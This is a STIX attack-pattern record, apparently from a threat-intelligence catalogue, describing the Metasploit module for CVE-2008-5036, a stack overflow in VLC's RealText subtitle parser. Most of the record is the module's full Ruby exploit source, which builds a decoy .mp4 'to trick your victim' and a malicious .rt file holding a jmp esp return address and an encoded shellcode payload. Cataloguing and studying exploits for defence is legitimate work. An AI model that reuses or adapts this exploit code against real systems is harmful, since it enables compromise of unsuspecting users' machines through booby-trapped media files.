{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f7f1cd5-d3a8-426c-8354-b3f3a5cdf56d",
    "created": "2024-08-14T16:37:42.175742Z",
    "modified": "2024-08-14T16:37:42.175746Z",
    "name": "VLC Media Player RealText Subtitle Overflow",
    "description": " This module exploits a stack buffer overflow vulnerability in VideoLAN VLC < 0.9.6. The vulnerability exists in the parsing of RealText subtitle files.  In order to exploit this, this module will generate two files: The .mp4 file is used to trick your victim into running. The .rt file is the actual malicious file that triggers the vulnerability, which should be placed under the same directory as the .mp4 file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/vlc_realtext.rb",
            "external_id": "vlc_realtext.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5036"
        },
        {
            "source_name": "reference",
            "url": "http://www.trapkit.de/advisories/TKADV2008-011.txt"
        },
        {
            "source_name": "reference",
            "url": "http://www.videolan.org/security/sa0810.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VLC Media Player RealText Subtitle Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow vulnerability in\n        VideoLAN VLC < 0.9.6. The vulnerability exists in the parsing of\n        RealText subtitle files.\n\n          In order to exploit this, this module will generate two files:\n        The .mp4 file is used to trick your victim into running. The .rt file\n        is the actual malicious file that triggers the vulnerability, which\n        should be placed under the same directory as the .mp4 file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tobias Klein',  # Vulnerability Discovery\n          'SkD', # Exploit\n          'juan vazquez' # Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '49809' ],\n          [ 'CVE', '2008-5036' ],\n          [ 'BID', '32125' ],\n          [ 'URL', 'http://www.trapkit.de/advisories/TKADV2008-011.txt' ],\n          [ 'URL', 'http://www.videolan.org/security/sa0810.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1900,\n          'DisableNops'    => true,\n          'BadChars'       => \"\\x00\\x22\\x0a\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'VLC 0.9.4 on Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret' => 0x68f0cfad, # jmp esp # libqt4_plugin.dll\n              'WritableAddress' => 0x695d5890 # libqt4_plugin.dll .data\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-11-05',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.rt']),\n      ])\n  end\n\n  def generate_mp4\n    mp4 = ''\n    # ftyp\n    mp4 << \"\\x00\\x00\\x00\\x14\"  #Size\n    mp4 << \"ftyp\"              #Type\n    mp4 << \"isom\"              #Major brand\n    mp4 << \"\\x00\\x00\"          #version\n    mp4 << \"\\x00\\x00\"\n    mp4 << \"mp41\"              #Compatible brands\n    # moov\n    mp4 << \"\\x00\\x00\\x00\\x9f\"  #Size\n    mp4 << \"moov\"              #Type\n    mp4 << \"\\x00\\x00\\x00\\x6c\\x6d\\x76\\x68\\x64\\x00\\x00\\x00\\x00\\xcb\\x75\\xf1\\xc2\\xcb\\x75\\xf1\\xc2\"\n    mp4 << \"\\x00\\x01\\x5f\\x90\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    mp4 << \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    mp4 << \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\"\n    mp4 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    mp4 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x2b\"\n    mp4 << \"udta\"\n    mp4 << \"\\x00\\x00\\x00\\x23\"\n    mp4 << \"\\xa9\\x65\\x6e\\x63\\x00\\x17\\x00\\x00\"\n    mp4 << \"vlc 0.9.4 stream output\"\n    # wide\n    mp4 << \"\\x00\\x00\\x00\\x08\"\n    mp4 << \"wide\"\n    # mdat\n    mp4 << \"\\x00\\x00\\x00\\x08\"\n    mp4 << \"mdat\"\n\n    return mp4\n  end\n\n  def generate_rt\n    my_payload = \"\"\n    my_payload << Rex::Text.rand_text(72, payload_badchars)\n    my_payload << [target.ret].pack(\"V\") # EIP => jmp esp\n    my_payload << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+8\").encode_string # ESP => jmp after \"Writable address\"\n    my_payload << Rex::Text.rand_text(2, payload_badchars)\n    my_payload << [target['WritableAddress']].pack(\"V\") # Writable address\n    my_payload << payload.encoded\n\n    rt_file = <<-eos\n<window height=\"250\" width=\"300\" duration=\"15\" bgcolor=\"yellow\">\nMary had a little lamb,\n<br/><time begin=\"#{my_payload}\"/>\n<br/><time begin=\"6\"/>little lamb,\n<br/><time begin=\"9\"/>Mary had a little lamb\n<br/><time begin=\"12\"/>whose fleece was white as snow.\n</window>\n    eos\n\n    return rt_file\n  end\n\n  def exploit\n\n    mp4 = generate_mp4\n    rt  = generate_rt\n\n    print_status(\"Creating '#{datastore['FILENAME']}'. Put this file under the same directory as the mp4 file\")\n    file_create(rt)\n\n    original_fname = datastore['FILENAME']\n    datastore['FILENAME'] = original_fname.scan(/(\\w+).\\w+/).flatten[0] + \".mp4\"\n    print_status(\"Creating '#{datastore['FILENAME']}'. This is the file your victim should open.\")\n    file_create(mp4)\n\n    datastore['FILENAME'] = original_fname\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-11-05",
    "x_mitre_platforms": [
        "win'"
    ]
}